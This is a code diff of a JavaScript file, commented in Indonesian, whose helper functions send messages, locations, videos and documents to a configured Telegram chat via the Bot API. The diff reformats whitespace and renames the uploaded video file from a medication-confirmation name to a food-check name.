@@ -10,11 +10,11 @@ const TG_BASE = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}`;
  * @param {string} text - Teks pesan (mendukung Markdown)
  */
 async function tgSendMessage(text) {
-  const res  = await fetch(`${TG_BASE}/sendMessage`, {
-    method:  'POST',
+  const res = await fetch(`${TG_BASE}/sendMessage`, {
+    method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body:    JSON.stringify({
-      chat_id:    CONFIG.TELEGRAM_CHAT_ID,
+    body: JSON.stringify({
+      chat_id: CONFIG.TELEGRAM_CHAT_ID,
       text,
       parse_mode: 'Markdown',
     }),
@@ -30,12 +30,12 @@ async function tgSendMessage(text) {
  * @param {number} lon - Longitude
  */
 async function tgSendLocation(lat, lon) {
-  const res  = await fetch(`${TG_BASE}/sendLocation`, {
-    method:  'POST',
+  const res = await fetch(`${TG_BASE}/sendLocation`, {
+    method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body:    JSON.stringify({
-      chat_id:   CONFIG.TELEGRAM_CHAT_ID,
-      latitude:  lat,
+    body: JSON.stringify({
+      chat_id: CONFIG.TELEGRAM_CHAT_ID,
+      latitude: lat,
       longitude: lon,
     }),
   });
@@ -51,14 +51,14 @@ async function tgSendLocation(lat, lon) {
  * @param {string} caption - Caption yang disertakan
  */
 async function tgSendVideo(blob, caption) {
-  const ext      = blob.type?.includes('mp4') ? 'mp4' : 'webm';
+  const ext = blob.type?.includes('mp4') ? 'mp4' : 'webm';
   const formData = new FormData();
-  formData.append('chat_id',            CONFIG.TELEGRAM_CHAT_ID);
-  formData.append('video',              blob, `konfirmasi_obat.${ext}`);
-  formData.append('caption',            caption);
+  formData.append('chat_id', CONFIG.TELEGRAM_CHAT_ID);
+  formData.append('video', blob, `periksa_makanan.${ext}`);
+  formData.append('caption', caption);
   formData.append('supports_streaming', 'true');
 
-  const res  = await fetch(`${TG_BASE}/sendVideo`, { method: 'POST', body: formData });
+  const res = await fetch(`${TG_BASE}/sendVideo`, { method: 'POST', body: formData });
   const data = await res.json();
 
   if (!data.ok) {
@@ -75,13 +75,13 @@ async function tgSendVideo(blob, caption) {
  * @param {string} caption - Caption yang disertakan
  */
 async function tgSendDocument(blob, caption) {
-  const ext      = blob.type?.includes('mp4') ? 'mp4' : 'webm';
+  const ext = blob.type?.includes('mp4') ? 'mp4' : 'webm';
   const formData = new FormData();
-  formData.append('chat_id',  CONFIG.TELEGRAM_CHAT_ID);
-  formData.append('document', blob, `konfirmasi_obat.${ext}`);
-  formData.append('caption',  caption);
+  formData.append('chat_id', CONFIG.TELEGRAM_CHAT_ID);
+  formData.append('document', blob, `periksa_makanan.${ext}`);
+  formData.append('caption', caption);
 
-  const res  = await fetch(`${TG_BASE}/sendDocument`, { method: 'POST', body: formData });
+  const res = await fetch(`${TG_BASE}/sendDocument`, { method: 'POST', body: formData });
   const data = await res.json();
   if (!data.ok) throw new Error(`Telegram sendDocument: ${data.description}`);
   return data;
